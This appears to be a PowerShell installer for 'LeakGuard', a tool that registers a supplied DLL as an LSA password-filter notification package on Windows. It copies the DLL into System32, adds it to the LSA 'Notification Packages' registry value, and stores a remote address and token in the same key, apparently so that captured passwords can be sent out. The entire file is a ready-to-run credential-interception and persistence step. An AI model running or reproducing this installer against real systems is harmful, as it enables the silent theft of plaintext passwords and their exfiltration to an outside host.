function Invoke-LeakGuard {
	param ( 
		[String]$dllpath,
		[String]$address,
        [String]$name,
		[String]$token
	)
	
	write-host "LeakGuard"
	write-host "https://github.com/xiosec/LeakGuard"

	write-host "[*] copy $dllpath -> System32"
	Copy-Item -Path $dllpath -Destination "$env:SystemRoot\System32"
	
	write-host "[*] copy $name -> Notification Packages"
	$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
	$notificationPackages = Get-ItemProperty -Path $registryPath -Name "Notification Packages"
	if ($notificationPackages."Notification Packages" -notcontains $name) {
		$notificationPackages."Notification Packages" += $name
		Set-ItemProperty -Path $registryPath -Name "Notification Packages" -Value $notificationPackages."Notification Packages"
	}

	write-host "[*] create $address key!"
	New-ItemProperty -Path $registryPath -Name "LeakGuard Address" -Value $address -PropertyType String -Force

	write-host "[*] create $token key!"
	New-ItemProperty -Path $registryPath -Name "LeakGuard Token" -Value $token -PropertyType String -Force
}